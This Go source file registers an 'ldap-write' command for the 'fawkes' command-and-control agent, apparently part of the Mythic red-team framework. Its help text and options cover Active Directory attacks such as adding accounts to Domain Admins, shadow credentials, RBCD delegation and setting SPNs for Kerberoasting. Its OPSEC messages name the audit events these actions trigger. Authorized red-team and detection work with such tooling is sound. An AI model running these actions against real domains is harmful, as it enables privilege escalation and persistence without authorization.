package agentfunctions

import (
	"fmt"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "ldap-write",
		Description:         "Modify Active Directory objects via LDAP. Add/remove group members, set attributes, manage SPNs, enable/disable accounts, set passwords, create machine accounts, RBCD delegation, shadow credentials, delete objects.",
		HelpString:          "ldap-write -action add-member -server dc01 -target jsmith -group \"Domain Admins\"\nldap-write -action shadow-cred -server dc01 -target victim -username user@domain -password pass\nldap-write -action set-rbcd -server dc01 -target victim -value FAKEPC01$",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1098", "T1098.005", "T1134.001", "T1136.002", "T1556.006"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				CLIName:          "action",
				ModalDisplayName: "Action",
				Description:      "Operation: add-member, remove-member, set-attr, add-attr, remove-attr, set-spn, disable, enable, set-password, add-computer, delete-object, set-rbcd, clear-rbcd, shadow-cred, clear-shadow-cred",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"add-member", "remove-member", "set-attr", "add-attr", "remove-attr", "set-spn", "disable", "enable", "set-password", "add-computer", "delete-object", "set-rbcd", "clear-rbcd", "shadow-cred", "clear-shadow-cred"},
				DefaultValue:     "add-member",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:                "server",
				CLIName:             "server",
				ModalDisplayName:    "Domain Controller",
				Description:         "DC IP address or hostname",
				ParameterType:       agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:        "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "target",
				CLIName:          "target",
				ModalDisplayName: "Target Object",
				Description:      "Object to modify (sAMAccountName, CN, or full DN)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "group",
				CLIName:          "group",
				ModalDisplayName: "Group",
				Description:      "Group name (for add-member/remove-member actions)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "attr",
				CLIName:          "attr",
				ModalDisplayName: "Attribute",
				Description:      "LDAP attribute name (for set-attr/add-attr/remove-attr)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "value",
				CLIName:          "value",
				ModalDisplayName: "Value",
				Description:      "Attribute value (for set-attr/add-attr/remove-attr/set-spn/set-password)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "username",
				CLIName:          "username",
				ModalDisplayName: "Username",
				Description:      "LDAP bind username (e.g., DOMAIN\\user or user@domain.local)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				DynamicQueryFunction: getCallbackUserList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "password",
				CLIName:          "password",
				ModalDisplayName: "Password",
				Description:      "LDAP bind password",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "base_dn",
				CLIName:          "base_dn",
				ModalDisplayName: "Base DN",
				Description:      "LDAP search base (auto-detected if empty)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "port",
				CLIName:          "port",
				ModalDisplayName: "Port",
				Description:      "LDAP port (default: 389, 636 for LDAPS)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     389,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "use_tls",
				CLIName:          "use_tls",
				ModalDisplayName: "Use LDAPS",
				Description:      "Use TLS/LDAPS (required for set-password)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				DefaultValue:     false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			target, _ := taskData.Args.GetStringArg("target")
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    fmt.Sprintf("OPSEC AUDIT: LDAP modification (%s on %s) completed. Event ID 5136/5137 generated in directory service audit log on the DC. Sensitive attribute changes (msDS-KeyCredentialLink, msDS-AllowedToActOnBehalfOfOtherIdentity, servicePrincipalName) are high-priority SOC alerts. Ensure cleanup of any shadow credentials or RBCD delegations after use.", action, target),
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			targetDN, _ := taskData.Args.GetStringArg("target_dn")
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: LDAP write (%s) to %s. Direct LDAP modifications generate Event ID 5136/5137 and are logged in the directory service audit log. Sensitive attribute modifications (e.g., msDS-AllowedToDelegateTo, servicePrincipalName) are high-priority detection targets.", action, targetDN),
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			server, _ := taskData.Args.GetStringArg("server")
			target, _ := taskData.Args.GetStringArg("target")
			group, _ := taskData.Args.GetStringArg("group")
			attr, _ := taskData.Args.GetStringArg("attr")
			value, _ := taskData.Args.GetStringArg("value")

			displayMsg := fmt.Sprintf("LDAP %s %s", action, target)
			artifactMsg := fmt.Sprintf("LDAP modify: %s on %s (server: %s)", action, target, server)

			switch action {
			case "add-member", "remove-member":
				displayMsg = fmt.Sprintf("LDAP %s %s → %s", action, target, group)
				artifactMsg = fmt.Sprintf("LDAP %s: %s → %s (server: %s)", action, target, group, server)
			case "set-attr", "add-attr", "remove-attr":
				displayMsg = fmt.Sprintf("LDAP %s %s.%s = %s", action, target, attr, value)
			case "set-spn":
				displayMsg = fmt.Sprintf("LDAP set-spn %s = %s", target, value)
			case "set-password":
				displayMsg = fmt.Sprintf("LDAP set-password %s", target)
			case "add-computer":
				displayMsg = fmt.Sprintf("LDAP add-computer %s", target)
				artifactMsg = fmt.Sprintf("LDAP add computer account: %s (server: %s)", target, server)
			case "delete-object":
				displayMsg = fmt.Sprintf("LDAP delete-object %s", target)
				artifactMsg = fmt.Sprintf("LDAP delete object: %s (server: %s)", target, server)
			case "set-rbcd":
				displayMsg = fmt.Sprintf("LDAP set-rbcd %s ← %s", target, value)
				artifactMsg = fmt.Sprintf("LDAP set RBCD: %s delegated to %s (server: %s)", target, value, server)
			case "clear-rbcd":
				displayMsg = fmt.Sprintf("LDAP clear-rbcd %s", target)
				artifactMsg = fmt.Sprintf("LDAP clear RBCD: %s (server: %s)", target, server)
			case "shadow-cred":
				displayMsg = fmt.Sprintf("LDAP shadow-cred %s", target)
				artifactMsg = fmt.Sprintf("LDAP write msDS-KeyCredentialLink: %s (server: %s)", target, server)
			case "clear-shadow-cred":
				displayMsg = fmt.Sprintf("LDAP clear-shadow-cred %s", target)
				artifactMsg = fmt.Sprintf("LDAP clear msDS-KeyCredentialLink: %s (server: %s)", target, server)
			}

			response.DisplayParams = &displayMsg

			createArtifact(taskData.Task.ID, "Network Connection", artifactMsg)

			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			if strings.Contains(responseText, "success") || strings.Contains(responseText, "Success") {
				switch action {
				case "add-member", "create-account":
					tagTask(processResponse.TaskData.Task.ID, "PERSIST",
						fmt.Sprintf("AD object modified: %s (T1098)", action))
				case "rbcd", "shadow-cred":
					tagTask(processResponse.TaskData.Task.ID, "PRIVESC",
						fmt.Sprintf("AD delegation attack: %s (T1134.001)", action))
				case "set-spn":
					tagTask(processResponse.TaskData.Task.ID, "CREDENTIAL",
						"SPN set for Kerberoasting (T1558.003)")
				}
			}
			return response
		},
	})
}
